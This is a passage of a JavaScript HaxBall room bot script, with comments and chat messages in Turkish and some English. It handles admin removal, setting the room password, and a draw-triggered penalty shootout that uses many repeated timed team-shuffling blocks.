            HaxNotification.CHAT
        );
    }
}

function removeAdminCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray.length > 0) {
        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
            if (room.getPlayer(parseInt(msgArray[0])) != null) {
                var playerAdmin = room.getPlayer(parseInt(msgArray[0]));

                if (adminList.map((a) => a[0]).includes(authArray[playerAdmin.id][0])) {
                    room.setPlayerAdmin(playerAdmin.id, false);
                    adminList = adminList.filter((a) => a[0] != authArray[playerAdmin.id][0]);
                    room.sendAnnouncement(
                        `${playerAdmin.name} is not a room admin anymore !`,
                        null,
                        announcementColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                } else {
                    room.sendAnnouncement(
                        `Bu kişi KURUCU Rolünde, Adminliğini Alamazsın !`,
                        player.id,
                        errorColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                }
            } else {
                room.sendAnnouncement(
                    `There is no player with such ID in the room. Enter "!help removeadmin" for more information.`,
                    player.id,
                    errorColor,
                    'bold',
                    HaxNotification.CHAT
                );
            }
        } else if (msgArray[0].length > 0 && parseInt(msgArray[0]) < adminList.length) {
            var index = parseInt(msgArray[0]);
            var playerAdmin = adminList[index];
            if (playersAll.findIndex((p) => authArray[p.id][0] == playerAdmin[0]) != -1) {
                // check if there is the removed admin in the room
                var indexRem = playersAll.findIndex((p) => authArray[p.id][0] == playerAdmin[0]);
                room.setPlayerAdmin(playersAll[indexRem].id, false);
            }
            adminList.splice(index);
            room.sendAnnouncement(
                `${playerAdmin[1]} artık admin değil !`,
                null,
                announcementColor,
                'bold',
                HaxNotification.CHAT
            );
        } else {
            room.sendAnnouncement(
                `Argümanınız için yanlış format. Daha fazla bilgi için "!help moveadmin" yazın.`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
    } else {
        room.sendAnnouncement(
            `Yanlış sayıda argüman. Daha fazla bilgi için "!help moveadmin" yazın.`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
    }
}

function passwordCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray.length > 0) {
        if (msgArray.length == 1 && msgArray[0] == '') {
            roomPassword = '';
            room.setPassword(null);
            room.sendAnnouncement(
                `The room password has been removed.`,
                player.id,
                announcementColor,
                'bold',
                HaxNotification.CHAT
            );
        }
        roomPassword = msgArray.join(' ');
        room.setPassword(roomPassword);
        room.sendAnnouncement(
            `Oda şifresi şu şekilde ayarlandı: ${roomPassword}`,
            player.id,
            announcementColor,
            'bold',
            HaxNotification.CHAT
        );
    } else {
        if (roomPassword != '') {
            roomPassword = '';
            room.setPassword(null);
            room.sendAnnouncement(
                `Oda şifresi kaldırıldı.`,
                player.id,
                announcementColor,
                'bold',
                HaxNotification.CHAT
            );
        } else {
            room.sendAnnouncement(
                `Odanın şu anda şifresi yok. Daha fazla bilgi için "!help password" girin.`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
    }
}

/* GAME FUNCTIONS */

function checkTime() {
    const scores = room.getScores();
    if (game != undefined) game.scores = scores;
    if (Math.abs(scores.time - scores.timeLimit) <= 0.01 && scores.timeLimit != 0 && playSituation == Situation.PLAY) {
        if (scores.red != scores.blue) {
            if (!checkTimeVariable) {
                checkTimeVariable = true;
                setTimeout(() => {
                    checkTimeVariable = false;
                }, 3000);
                scores.red > scores.blue ? endGame(Team.RED) : endGame(Team.BLUE);
                stopTimeout = setTimeout(() => {
                    room.stopGame();
                }, 2000);
            }
            return;
        }
        if (drawTimeLimit != 0) {
        room.stopGame();
room.sendAnnouncement("┌───────────────────────────────────────────────────────────────────┐", null, 0xb672ff, "small", 1)
room.sendAnnouncement("                             E Ş İ T L İ K    V A R   P E N A L T I L A R A    G İ D İ Y O R U Z", null, 0xb672ff, "bold", 1)
room.sendAnnouncement("└───────────────────────────────────────────────────────────────────┘", null, 0xb672ff, "small", 1)
        }
    setTimeout(function () {
    room.setCustomStadium(PenaltıMap());
    var players = room.getPlayerList();
    for (var i = 0; i < players.length; i++) {
        var player = players[i];
        room.setPlayerTeam(player.id, 0); // 0, spece atmak için kullanılan takım numarasıdır.
    }
    var players = room.getPlayerList();
    if (players.length > 0) {
        var randomIndex = Math.floor(Math.random() * players.length);
        var randomPlayer = players[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // 1, kırmızı takımın numarasıdır.
    }
    var players = room.getPlayerList();
    if (players.length > 0) {
        var randomIndex = Math.floor(Math.random() * players.length);
        var randomPlayer = players[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // 2, mavi takımın numarasıdır.
    }
    room.startGame();
    }, 3000);

setTimeout(function() {
    var players = room.getPlayerList();
    var maviTakimOyunculari = players.filter(function(player) {
        return player.team === 2; // Mavi takımın numarası 2
    });

    var kirmiziTakimOyunculari = players.filter(function(player) {
        return player.team === 1; // Kırmızı takımın numarası 1
    });

    var takim0Oyunculari = players.filter(function(player) {
        return player.team === 0; // Takım 0'ın numarası 0
    });

    if (maviTakimOyunculari.length === 0) {
        // Eğer mavi takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // Mavi takımın numarası 2
    }

    if (kirmiziTakimOyunculari.length === 0) {
        // Eğer kırmızı takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // Kırmızı takımın numarası 1
    }
}, 3000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 3000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 4000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 5000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 6000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 7000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 8000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 9000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 10000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 11000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 12000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 13000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 14000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 15000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 16000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 17000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 18000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 19000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 20000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 21000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 22000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 23000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 24000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 2; // Mavi takım oyuncularının takım numarası 2'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 25000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 3000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 4000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 5000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 6000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 7000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 8000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 9000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 10000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 11000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 12000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 13000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 14000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 15000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 16000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 17000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 18000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 19000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 20000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 21000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 22000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 23000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 24000);

setTimeout(function() {
  var maviTakimOyunculari = room.getPlayerList().filter(function(player) {
    return player.team == 1; // Kırmızı takım oyuncularının takım numarası 1'dir.
  });

  if (maviTakimOyunculari.length > 1) {
    maviTakimOyunculari.forEach(function(player) {
      room.sendCommand("changeteam " + player.id + " 0");
    });
  }
}, 25000);

setTimeout(function() {
    var players = room.getPlayerList();
    var maviTakimOyunculari = players.filter(function(player) {
        return player.team === 2; // Mavi takımın numarası 2
    });

    var kirmiziTakimOyunculari = players.filter(function(player) {
        return player.team === 1; // Kırmızı takımın numarası 1
    });

    var takim0Oyunculari = players.filter(function(player) {
        return player.team === 0; // Takım 0'ın numarası 0
    });

    if (maviTakimOyunculari.length === 0) {
        // Eğer mavi takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // Mavi takımın numarası 2
    }

    if (kirmiziTakimOyunculari.length === 0) {
        // Eğer kırmızı takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // Kırmızı takımın numarası 1
    }
}, 4000);

setTimeout(function() {
    var players = room.getPlayerList();
    var maviTakimOyunculari = players.filter(function(player) {
        return player.team === 2; // Mavi takımın numarası 2
    });

    var kirmiziTakimOyunculari = players.filter(function(player) {
        return player.team === 1; // Kırmızı takımın numarası 1
    });

    var takim0Oyunculari = players.filter(function(player) {
        return player.team === 0; // Takım 0'ın numarası 0
    });

    if (maviTakimOyunculari.length === 0) {
        // Eğer mavi takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // Mavi takımın numarası 2
    }

    if (kirmiziTakimOyunculari.length === 0) {
        // Eğer kırmızı takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // Kırmızı takımın numarası 1
    }
}, 5000);

    setTimeout(function () {
    room.sendAnnouncement("🥅 Penaltı Süresi Geçti!", null, 0x00e600, "bold"); // 1
    }, 9000);
    setTimeout(function () {
        room.stopGame();
    room.setCustomStadium(PenaltıMap());
    var players = room.getPlayerList();
    for (var i = 0; i < players.length; i++) {
        var player = players[i];
        room.setPlayerTeam(player.id, 0); // 0, spece atmak için kullanılan takım numarasıdır.
    }
    var players = room.getPlayerList();
    if (players.length > 0) {
        var randomIndex = Math.floor(Math.random() * players.length);
        var randomPlayer = players[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // 1, kırmızı takımın numarasıdır.
    }
    var players = room.getPlayerList();
    if (players.length > 0) {
        var randomIndex = Math.floor(Math.random() * players.length);
        var randomPlayer = players[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // 2, mavi takımın numarasıdır.
    }
    room.startGame();
    }, 10000);

setTimeout(function() {
    var players = room.getPlayerList();
    var maviTakimOyunculari = players.filter(function(player) {
        return player.team === 2; // Mavi takımın numarası 2
    });

    var kirmiziTakimOyunculari = players.filter(function(player) {
        return player.team === 1; // Kırmızı takımın numarası 1
    });

    var takim0Oyunculari = players.filter(function(player) {
        return player.team === 0; // Takım 0'ın numarası 0
    });

    if (maviTakimOyunculari.length === 0) {
        // Eğer mavi takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // Mavi takımın numarası 2
    }

    if (kirmiziTakimOyunculari.length === 0) {
        // Eğer kırmızı takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // Kırmızı takımın numarası 1
    }
}, 10000);

setTimeout(function() {
    var players = room.getPlayerList();
    var maviTakimOyunculari = players.filter(function(player) {
        return player.team === 2; // Mavi takımın numarası 2
    });

    var kirmiziTakimOyunculari = players.filter(function(player) {
        return player.team === 1; // Kırmızı takımın numarası 1
    });

    var takim0Oyunculari = players.filter(function(player) {
        return player.team === 0; // Takım 0'ın numarası 0
    });

    if (maviTakimOyunculari.length === 0) {
        // Eğer mavi takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // Mavi takımın numarası 2
    }

    if (kirmiziTakimOyunculari.length === 0) {
        // Eğer kırmızı takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // Kırmızı takımın numarası 1
    }
}, 11000);

setTimeout(function() {
    var players = room.getPlayerList();
    var maviTakimOyunculari = players.filter(function(player) {
        return player.team === 2; // Mavi takımın numarası 2
    });

    var kirmiziTakimOyunculari = players.filter(function(player) {
        return player.team === 1; // Kırmızı takımın numarası 1
    });

    var takim0Oyunculari = players.filter(function(player) {
        return player.team === 0; // Takım 0'ın numarası 0
    });

    if (maviTakimOyunculari.length === 0) {
        // Eğer mavi takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // Mavi takımın numarası 2
    }

    if (kirmiziTakimOyunculari.length === 0) {
        // Eğer kırmızı takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // Kırmızı takımın numarası 1
    }
}, 12000);

    setTimeout(function () {
    room.sendAnnouncement("🥅 Penaltı Süresi Geçti!", null, 0x00e600, "bold"); // 2
    }, 16000);
    setTimeout(function () {
        room.stopGame();
    room.setCustomStadium(PenaltıMap());
    var players = room.getPlayerList();
    for (var i = 0; i < players.length; i++) {
        var player = players[i];
        room.setPlayerTeam(player.id, 0); // 0, spece atmak için kullanılan takım numarasıdır.
    }
    var players = room.getPlayerList();
    if (players.length > 0) {
        var randomIndex = Math.floor(Math.random() * players.length);
        var randomPlayer = players[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // 1, kırmızı takımın numarasıdır.
    }
    var players = room.getPlayerList();
    if (players.length > 0) {
        var randomIndex = Math.floor(Math.random() * players.length);
        var randomPlayer = players[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // 2, mavi takımın numarasıdır.
    }
    room.startGame();
    }, 17000);

setTimeout(function() {
    var players = room.getPlayerList();
    var maviTakimOyunculari = players.filter(function(player) {
        return player.team === 2; // Mavi takımın numarası 2
    });

    var kirmiziTakimOyunculari = players.filter(function(player) {
        return player.team === 1; // Kırmızı takımın numarası 1
    });

    var takim0Oyunculari = players.filter(function(player) {
        return player.team === 0; // Takım 0'ın numarası 0
    });

    if (maviTakimOyunculari.length === 0) {
        // Eğer mavi takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // Mavi takımın numarası 2
    }

    if (kirmiziTakimOyunculari.length === 0) {
        // Eğer kırmızı takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // Kırmızı takımın numarası 1
    }
}, 17000);

setTimeout(function() {
    var players = room.getPlayerList();
    var maviTakimOyunculari = players.filter(function(player) {
        return player.team === 2; // Mavi takımın numarası 2
    });

    var kirmiziTakimOyunculari = players.filter(function(player) {
        return player.team === 1; // Kırmızı takımın numarası 1
    });

    var takim0Oyunculari = players.filter(function(player) {
        return player.team === 0; // Takım 0'ın numarası 0
    });

    if (maviTakimOyunculari.length === 0) {
        // Eğer mavi takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // Mavi takımın numarası 2
    }

    if (kirmiziTakimOyunculari.length === 0) {
        // Eğer kırmızı takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // Kırmızı takımın numarası 1
    }
}, 18000);

setTimeout(function() {
    var players = room.getPlayerList();
    var maviTakimOyunculari = players.filter(function(player) {
        return player.team === 2; // Mavi takımın numarası 2
    });

    var kirmiziTakimOyunculari = players.filter(function(player) {
        return player.team === 1; // Kırmızı takımın numarası 1
    });

    var takim0Oyunculari = players.filter(function(player) {
        return player.team === 0; // Takım 0'ın numarası 0
    });

    if (maviTakimOyunculari.length === 0) {
        // Eğer mavi takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // Mavi takımın numarası 2
    }

    if (kirmiziTakimOyunculari.length === 0) {
        // Eğer kırmızı takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // Kırmızı takımın numarası 1
    }
}, 19000);

    setTimeout(function () {
